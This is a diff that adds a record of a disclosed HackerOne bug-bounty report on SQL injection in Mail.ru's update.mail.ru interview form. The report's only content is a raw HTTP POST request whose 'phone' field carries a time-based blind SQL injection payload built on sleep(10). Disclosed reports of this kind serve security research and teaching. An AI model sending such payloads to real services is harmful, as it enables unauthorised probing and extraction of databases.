@@ -1,0 +1,22 @@
+ReportLink:https://hackerone.com/reports/11861
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/vah13
+ReportedTo:Mail.ru(mailru)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:30.05.2014 11:39:42
+
+Summary:
+
+POST /interview/?interview HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Host: update.mail.ru
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
+Accept: */*
+Content-Length: 92
+
+email=e&media=e&phone=/*'XOR(if(2=2,sleep(10),0))OR'&position=e&speaker=&username=e
